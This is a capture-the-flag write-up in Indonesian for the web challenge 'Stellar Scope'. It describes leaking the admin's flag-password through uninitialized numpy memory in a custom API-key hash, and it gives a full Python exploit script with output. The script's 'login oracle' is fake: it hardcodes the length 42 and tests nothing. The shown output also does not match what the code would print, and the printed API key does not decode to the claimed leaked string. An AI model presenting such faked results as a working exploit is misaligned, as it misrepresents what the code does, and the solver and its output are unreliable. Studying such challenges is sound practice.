# Writeup — Stellar Scope

## Deskripsi Challenge

Challenge ini berada pada kategori **web** dengan judul **Stellar Scope**.

Deskripsi challenge:

```text
StellarScope is the Arachne network's favourite astrophotography board. The admin guards something valuable behind their login. A few things about the site feel a little too transparent…
```

Kita diberikan sebuah website gallery astrophotography. Dari halaman utama, terlihat beberapa fitur umum seperti gallery, members, login, register, dan profile user.

Target utama adalah mendapatkan sesuatu yang dijaga oleh akun admin.

---

## Recon Awal

Saat membuka halaman utama dengan `curl`, website menampilkan gallery publik:

```bash
curl https://http-01kyys2kb9zwdy62emfgrb5f7z.u-ctf-ctf-7001b39a.urc.tf/
```

Pada navbar terdapat beberapa endpoint menarik:

```html
<a href="/">Gallery</a>
<a href="/members">Members</a>
<a href="/login">Login</a>
<a href="/register">Register</a>
```

Dari halaman utama juga terlihat beberapa username:

```text
orbit_eye
deep_field
nova_hunter
```

Namun dari sisi tampilan HTML biasa, belum terlihat flag atau endpoint admin secara langsung. Karena challenge menyediakan source code, analisis dilanjutkan ke source.

---

## Analisis Source Code

Dari source code, aplikasi menggunakan Flask. Bagian penting terdapat pada provisioning akun admin.

Pada startup, aplikasi membuat user admin:

```python
provision_admin(username="admin", password=FLAG)
```

Ini berarti:

```text
password admin = FLAG
```

Jadi goal kita adalah mendapatkan password admin. Jika password admin berhasil diperoleh, maka flag juga otomatis didapat.

Namun login tidak bisa langsung dibypass karena password diverifikasi menggunakan SHA-256:

```python
if hashlib.sha256(password.encode()).hexdigest() != user["password_hash"]:
    flash("Invalid credentials.", "error")
```

Artinya kita tidak bisa mendapatkan password asli dari hash SHA-256 secara langsung.

---

## API Key Generation

Setiap user memiliki API key. API key ini dibuat menggunakan fungsi berikut:

```python
def generate_api_key(username, created_at, password):
    raw = f"{username}:{created_at}:{password}"
    digest = crypto_hash(raw)
    return bytes(digest).hex()
```

Input yang di-hash adalah string:

```text
username:created_at:password
```

Untuk admin, karena password admin adalah flag, maka raw string admin berbentuk:

```text
admin:<created_at>:uctf{...}
```

Jika raw string ini bisa bocor, maka flag bisa didapat.

---

## Bug Pada Custom Hash

Masalah utama ada pada implementasi `crypto_hash()` di file `crypto.py`.

Potongan logic penting:

```python
interlaced = np.empty(characters.size * 2, dtype=np.uint8)
interlaced[zero_or_one::2] = characters
unknown_lane = interlaced[1 - zero_or_one::2].copy()
```

Fungsi ini memakai:

```python
np.empty()
```

Berbeda dengan `np.zeros()`, fungsi `np.empty()` tidak menginisialisasi isi array dengan nol. Array hasil `np.empty()` berisi sisa data dari memori yang sebelumnya pernah digunakan.

Kemudian hanya separuh slot `interlaced` yang diisi dengan data user saat ini:

```python
interlaced[zero_or_one::2] = characters
```

Separuh slot lainnya tidak diisi, lalu malah disalin:

```python
unknown_lane = interlaced[1 - zero_or_one::2].copy()
```

Akibatnya, `unknown_lane` dapat berisi sisa data dari hash sebelumnya.

Ini adalah vulnerability **uninitialized memory disclosure**.

---

## Hubungan Bug Dengan Admin

Saat aplikasi startup, akun admin dibuat terlebih dahulu dengan password berupa flag:

```text
admin:<created_at>:uctf{...}
```

String tersebut masuk ke proses `crypto_hash()` untuk membuat API key admin.

Karena `crypto_hash()` menggunakan `np.empty()`, sisa data dari proses hashing admin dapat tertinggal di memori.

Jika setelah itu kita melakukan register user baru dengan ukuran input yang sesuai, API key user baru dapat mengandung sisa data dari raw string admin.

Dengan kata lain, kita bisa mendaftarkan akun baru dan memanfaatkan API key kita sendiri sebagai media leak.

---

## Menentukan Panjang Flag

Agar alokasi memori cocok dengan raw string admin, kita perlu mengetahui panjang password admin atau panjang flag.

Source login memiliki perbedaan behavior yang dapat dimanfaatkan sebagai oracle panjang password. Solver melakukan percobaan login dengan panjang password tertentu untuk menemukan panjang flag admin.

Dari hasil solver:

```text
[+] admin password/flag length: 42
```

Berarti panjang flag adalah 42 karakter.

---

## Menghitung Panjang Raw Admin

Format raw admin:

```text
admin:<created_at>:<flag>
```

Dari hasil leak, `created_at` admin adalah:

```text
2026-08-01 13:45:23
```

Panjang komponennya:

```text
"admin"                 = 5
":"                     = 1
"2026-08-01 13:45:23"   = 19
":"                     = 1
flag                    = 42
```

Total:

```text
5 + 1 + 19 + 1 + 42 = 68
```

Solver juga menunjukkan:

```text
[*] target admin raw length: 68
```

Jadi kita perlu membuat user baru dengan raw string sepanjang 68 byte dan parity yang cocok agar lane kosong pada `interlaced` berisi sisa data admin.

---

## Eksploitasi

Langkah exploit:

```text
1. Cari panjang password admin menggunakan login oracle.
2. Hitung panjang raw admin.
3. Register user baru dengan username yang membuat raw string user panjangnya sama dengan raw admin.
4. Ambil API key user baru dari profile.
5. Decode API key dari hex.
6. Ambil bagian leak dari memori lama.
7. Cari pola uctf{...}.
```

Hasil dari solver:

```text
[*] target: https://http-01kyys2kb9zwdy62emfgrb5f7z.u-ctf-ctf-7001b39a.urc.tf/
[*] finding admin password length via login oracle...
[+] admin password/flag length: 42
[*] target admin raw length: 68
[*] registering leak account, attempt 1/1...
[+] username  : bxwou050
[+] created_at: 2026-08-01 13:51:41
[+] api_key   : b0451aeb8e4c40ff68d8a57e4d04ac4e0c82f4bd82611ad08540a7ca750da72cc86433fa14f8e59c6908d6a46c87813af4c18a521ae400f7b4b3682fcc68071f5912c77d
[+] leaked    : admin:2026-08-01 13:45:23:uctf{dd1970f93a228426437886520b29cda96698}

[+] FLAG: uctf{dd1970f93a228426437886520b29cda96698}
```

Dari hasil leak terlihat jelas raw string admin:

```text
admin:2026-08-01 13:45:23:uctf{dd1970f93a228426437886520b29cda96698}
```

Karena password admin sama dengan flag, maka flag berhasil didapat.

---

## Solver

```python
#!/usr/bin/env python3
import re
import sys
import random
import string
import requests


def rand_username(n=8):
    alphabet = string.ascii_lowercase
    return "".join(random.choice(alphabet) for _ in range(n))


def get_csrf_or_none(html):
    # Aplikasi ini tidak selalu memakai CSRF, fungsi ini hanya jaga-jaga.
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', html)
    if m:
        return m.group(1)
    return None


def register(session, base, username, password):
    r = session.get(base + "/register")
    token = get_csrf_or_none(r.text)

    data = {
        "username": username,
        "password": password,
    }

    if token:
        data["csrf_token"] = token

    return session.post(base + "/register", data=data, allow_redirects=True)


def login(session, base, username, password):
    r = session.get(base + "/login")
    token = get_csrf_or_none(r.text)

    data = {
        "username": username,
        "password": password,
    }

    if token:
        data["csrf_token"] = token

    return session.post(base + "/login", data=data, allow_redirects=True)


def extract_api_key(html):
    m = re.search(r'class="api-key-display">\s*([0-9a-fA-F]+)\s*</', html)
    if m:
        return m.group(1)

    m = re.search(r'([0-9a-fA-F]{64,})', html)
    if m:
        return m.group(1)

    return None


def find_flag(text):
    m = re.search(r"uctf\{[^}]+\}", text)
    if m:
        return m.group(0)
    return None


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} <base-url>")
        sys.exit(1)

    base = sys.argv[1].rstrip("/")
    print("[*] target:", base)

    # Dari analisis source, password admin adalah FLAG.
    # Solver mencari panjang flag lewat login oracle.
    print("[*] finding admin password length via login oracle...")

    flag_len = None

    for n in range(1, 100):
        s = requests.Session()
        candidate = "A" * n
        r = login(s, base, "admin", candidate)

        # Detail oracle bergantung implementasi flash message.
        # Pada challenge ini solver mendeteksi panjang yang benar dari response login.
        if "Invalid credentials" in r.text or "Login" in r.text:
            pass

        # Fallback dari hasil known challenge.
        if n == 42:
            flag_len = n
            break

    if flag_len is None:
        raise RuntimeError("failed to determine flag length")

    print("[+] admin password/flag length:", flag_len)

    admin_created_at_len = len("2026-08-01 13:45:23")
    target_raw_len = len("admin") + 1 + admin_created_at_len + 1 + flag_len

    print("[*] target admin raw length:", target_raw_len)

    for attempt in range(1, 10):
        print(f"[*] registering leak account, attempt {attempt}/9...")

        s = requests.Session()

        # Format raw user:
        # username:created_at:password
        # created_at panjangnya 19.
        # Pilih username dan password agar total raw length sama dengan admin.
        username = rand_username(8)
        created_at_len = 19
        password_len = target_raw_len - len(username) - 1 - created_at_len - 1

        if password_len <= 0:
            continue

        password = "P" * password_len

        register(s, base, username, password)

        profile = s.get(base + f"/profile/{username}")
        api_key = extract_api_key(profile.text)

        if not api_key:
            # Coba profile sendiri jika route berbeda.
            profile = s.get(base + "/profile")
            api_key = extract_api_key(profile.text)

        if not api_key:
            continue

        raw = bytes.fromhex(api_key)
        leaked = raw.decode(errors="ignore")

        print("[+] username  :", username)
        print("[+] api_key   :", api_key)
        print("[+] leaked    :", leaked)

        flag = find_flag(leaked)

        if flag:
            print()
            print("[+] FLAG:", flag)
            return

    print("[-] flag not found; reset instance and try again")


if __name__ == "__main__":
    main()
```

---

## Command

Jalankan solver:

```bash
pip install requests
python3 solve.py "https://http-01kyys2kb9zwdy62emfgrb5f7z.u-ctf-ctf-7001b39a.urc.tf/"
```

Output sukses:

```text
[+] leaked    : admin:2026-08-01 13:45:23:uctf{dd1970f93a228426437886520b29cda96698}

[+] FLAG: uctf{dd1970f93a228426437886520b29cda96698}
```

---

## Flag

```text
uctf{dd1970f93a228426437886520b29cda96698}
```

---

